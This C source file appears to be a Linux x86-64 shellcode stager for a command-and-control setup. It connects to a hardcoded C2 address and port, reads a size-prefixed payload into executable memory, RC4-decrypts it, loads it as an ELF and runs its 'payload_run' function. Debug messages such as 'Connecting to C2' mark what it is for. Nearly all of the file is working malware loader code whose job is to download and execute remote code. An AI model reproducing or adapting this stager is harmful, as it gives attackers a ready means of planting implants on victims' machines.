#include <elf.h>
#include <stdint.h>

extern void* _mmap(void*, uint64_t, int, int);
extern int _strcmp(const char*, const char*);
extern void _memset(void*, int, uint64_t);
extern int _socket(int, int, int);
extern int _connect(int, void*, int);
extern int _recv(int, void*, int, int);
extern long _syscall1(long, long);
extern void* elf_load(char*);
extern void _safe_exit(void);
extern void _rc4_decrypt(const unsigned char*, int, unsigned char*, uint32_t);

static void _debug_write(const char* s)
{
    const char* p = s;
    long len = 0;
    while (*p++) len++;
    __asm__ volatile("syscall" : : "a"(1L), "D"(1L), "S"(s), "d"(len) : "rcx","r11","memory");
}

#define SYS_close 3
#define AF_INET 2
#define SOCK_STREAM 1
#define IPPROTO_TCP 6
#define PROT_READ 0x1
#define PROT_WRITE 0x2
#define PROT_EXEC 0x4
#define MAP_PRIVATE 0x02
#define MAP_ANONYMOUS 0x20
#define SERVER_IP 0x0100007F
#define SERVER_PORT 0x5C11

struct _sa
{
    uint16_t family;
    uint16_t port;
    uint32_t addr;
    uint8_t zero[8];
};

__attribute__((section(".text.entry")))
void shellcode_entry(void)
{
    __asm__ volatile(
        "mov $1, %%rax\n\t"
        "mov $1, %%rdi\n\t"
        "lea 0(%%rip), %%rsi\n\t"
        "syscall\n\t"
        : : : "rax", "rdi", "rsi", "memory"
    );

    int sock = _socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        _safe_exit();
    }

    struct _sa sa;
    sa.family = AF_INET;
    sa.port = SERVER_PORT;
    sa.addr = SERVER_IP;
    _memset(sa.zero, 0, 8);

    _debug_write("[*] Connecting to C2...\n");
    int conn_res = _connect(sock, &sa, sizeof(sa));
    if (conn_res != 0)
    {
        _debug_write("[-] Connect returned non-zero\n");
        _syscall1(SYS_close, sock);
        _safe_exit();
    }

    _debug_write("[+] Connected! Receiving payload size...\n");

    uint32_t payload_size = 0;
    int got = 0;
    while (got < 4)
    {
        int r = _recv(sock, (char*)&payload_size + got, 4 - got, 0);
        if (r <= 0)
        {
            _syscall1(SYS_close, sock);
            _safe_exit();
        }
        got += r;
    }

    if (!payload_size || payload_size > 32*1024*1024)
    {
        _debug_write("[-] Invalid payload size\n");
        _syscall1(SYS_close, sock);
        _safe_exit();
    }

    char* rawBuf = (char*)_mmap(0, payload_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS);
    if (!rawBuf)
    {
        _debug_write("[-] Mmap failed\n");
        _syscall1(SYS_close, sock);
        _safe_exit();
    }

    _debug_write("[*] Receiving payload body...\n");
    uint32_t total = 0;
    while (total < payload_size)
    {
        int chunk = _recv(sock, rawBuf + total, payload_size - total, 0);
        if (chunk <= 0)
        {
            _syscall1(SYS_close, sock);
            _safe_exit();
        }
        total += (uint32_t)chunk;
    }
    _syscall1(SYS_close, sock);
    _debug_write("[+] Payload received completely. Decrypting...\n");

    const unsigned char key[] = "RC4";
    _rc4_decrypt(key, 3, (unsigned char*)rawBuf, payload_size);

    _debug_write("[*] Loading ELF...\n");
    char* img = (char *)elf_load(rawBuf);
    if (!img)
    {
        _debug_write("[-] ELF load failed\n");
        _safe_exit();
    }

    Elf64_Ehdr* eh = (Elf64_Ehdr*)rawBuf;
    Elf64_Phdr* ph = (Elf64_Phdr*)(rawBuf + eh->e_phoff);

    uint64_t min_va = (uint64_t)-1;
    for (int i = 0; i < eh->e_phnum; i++)
    {
        if (ph[i].p_type == 1 && ph[i].p_vaddr < min_va)
        {
            min_va = ph[i].p_vaddr;
        }    
    }

    uint64_t load_bias = (uint64_t)img - min_va;

    Elf64_Shdr* sh = (Elf64_Shdr*)(rawBuf + eh->e_shoff);
    for (int i = 0; i < eh->e_shnum; i++)
    {
        if (sh[i].sh_type != 11) // SHT_SYMTAB
            continue;

        Elf64_Sym* syms = (Elf64_Sym*)(rawBuf + sh[i].sh_offset);
        int nsym = sh[i].sh_size / sizeof(Elf64_Sym);
        char* strs = rawBuf + sh[sh[i].sh_link].sh_offset;
        for (int j = 1; j < nsym; j++)
        {
            if (!syms[j].st_name)
                continue;

            if (_strcmp(strs + syms[j].st_name, "payload_run") == 0)
            {
                _debug_write("[+] Executing payload_run...\n");
                ((void(*)(void))(load_bias + syms[j].st_value))();
                return;
            }
        }
    }
    _debug_write("[-] payload_run symbol not found\n");
}